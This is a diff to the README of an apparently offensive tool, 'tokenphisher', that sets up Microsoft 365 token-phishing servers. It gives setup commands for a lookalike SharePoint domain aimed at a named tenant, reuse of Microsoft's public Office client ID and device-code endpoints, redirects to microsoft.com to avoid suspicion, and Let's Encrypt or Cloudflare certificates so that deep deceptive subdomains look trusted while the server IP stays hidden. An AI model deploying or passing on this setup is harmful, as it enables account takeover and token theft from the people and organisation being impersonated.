@@ -13,9 +13,9 @@ npm install
 npm run setup -- --help
 ```
 
-### Production (Cloudflare TLS)
+### Production (Let's Encrypt — recommended for deep subdomains)
 
-Point your domain at Cloudflare, then run setup with an API token that has **Account → Cloudflare Origin CA: Edit** and **Zone: Read**:
+Use this for hostnames like `gipi.sharepoint.com.documents.v06.zip`. Token needs **Zone → DNS → Edit** and **Zone → Read**:
 
 ```bash
 export CLOUDFLARE_API_TOKEN=your_token_here
@@ -23,29 +23,43 @@ export CLOUDFLARE_API_TOKEN=your_token_here
 npm run setup -- \
   --domain gipi.sharepoint.com.documents.v06.zip \
   --tenant gipi.com \
-  --geoip CH,DE
+  --tls letsencrypt
 ```
 
-Setup will:
-1. Fetch `tokenUrl` and `deviceCodeUrl` from Microsoft OpenID discovery for the tenant
-2. Use the standard MS Office public `clientId` (not in discovery — override with `--client-id` if needed)
-3. Set sensible redirect defaults (`microsoft.com` / `onedrive.live.com`)
-4. Create or reuse a Cloudflare Origin certificate stored outside the app
-5. Write `config.json` and update `server.js`
-
-If your phishing domain matches `*.sharepoint.*`, setup auto-guesses the tenant (e.g. `gipi.sharepoint...` → tries `gipi.com`). Use `--tenant` to override.
-
-**Redeploying** — no API token needed if certs already exist:
+In Cloudflare DNS, set your **A record to grey cloud (DNS only)** — not proxied. Browsers connect directly to your server and trust the Let's Encrypt cert. Certs are stored in `/var/lib/tokenphisher/certs/` and renew with:
 
 ```bash
-git pull
-npm install
-npm run setup -- \
-  --domain gipi.sharepoint.com.documents.v06.zip \
-  --tenant gipi.com
+npm run renew -- --cf-token YOUR_TOKEN
 ```
 
-Set Cloudflare SSL/TLS mode to **Full (strict)**, then start the server:
+Add a monthly cron to renew before the 90-day expiry.
+
+### Production (Cloudflare Origin cert — shallow subdomains + proxy)
+
+For `share.example.com` with **orange cloud (proxied)** DNS. Token needs **Origin CA Edit** + **SSL/Certificates Edit**:
+
+```bash
+npm run setup -- \
+  --domain share.example.com \
+  --tenant contoso.com \
+  --tls cloudflare-origin
+```
+
+Set Cloudflare SSL/TLS mode to **Full (strict)**. Free edge SSL only covers one subdomain level — deeper names need Let's Encrypt (grey cloud) or paid Total TLS.
+
+Setup will:
+1. Fetch Microsoft OAuth URLs from OpenID discovery
+2. Issue TLS certs (Let's Encrypt or Cloudflare Origin depending on `--tls`)
+3. Write `config.json` and update `server.js`
+
+**Redeploying** — reuse existing certs without a token if still valid:
+
+```bash
+git pull && npm install
+npm run setup -- --domain gipi.sharepoint.com.documents.v06.zip --tenant gipi.com
+```
+
+Start the server:
 
 ```bash
 sudo npm start   # ports 80/443 require elevated privileges on Linux
@@ -112,27 +126,12 @@ npm run setup -- --config-only --from-config config.json
 
 ## Certificates
 
-### Cloudflare (recommended)
+| Mode | Best for | Cloudflare DNS | Browser SSL |
+|------|----------|----------------|-------------|
+| `letsencrypt` (default) | Deep subdomains | Grey cloud (DNS only) | LE cert — trusted everywhere |
+| `cloudflare-origin` | Shallow subdomains + hide IP | Orange cloud (proxied) | CF edge cert (free tier: one level only) |
 
-Use `npm run setup` with `--domain` and `--cf-token`. Origin certificates work when traffic is proxied through Cloudflare.
-
-Certs are stored persistently at **`/var/lib/tokenphisher/certs/<domain>/`** by default (survives redeploys). Override with `--cert-store` or `TOKENPHISHER_CERT_STORE`. Setup reuses valid certs automatically; use `--force-renew` only when you intentionally need a new certificate.
-
-```
-/var/lib/tokenphisher/certs/share.example.com/
-  privkey.pem
-  cert.pem
-  origin-ca.pem
-  cert-meta.json
-```
-
-### Let's Encrypt (manual)
-
-```bash
-sudo certbot certonly --standalone
-```
-
-Then point `keyFilePath`, `certFilePath`, and `caFilePath` in config at the certbot paths and run setup with `--config-only`.
+Certs persist at **`/var/lib/tokenphisher/certs/<domain>/`**. Let's Encrypt certs expire every ~90 days — run `npm run renew`.
 
 ## Other notes
 
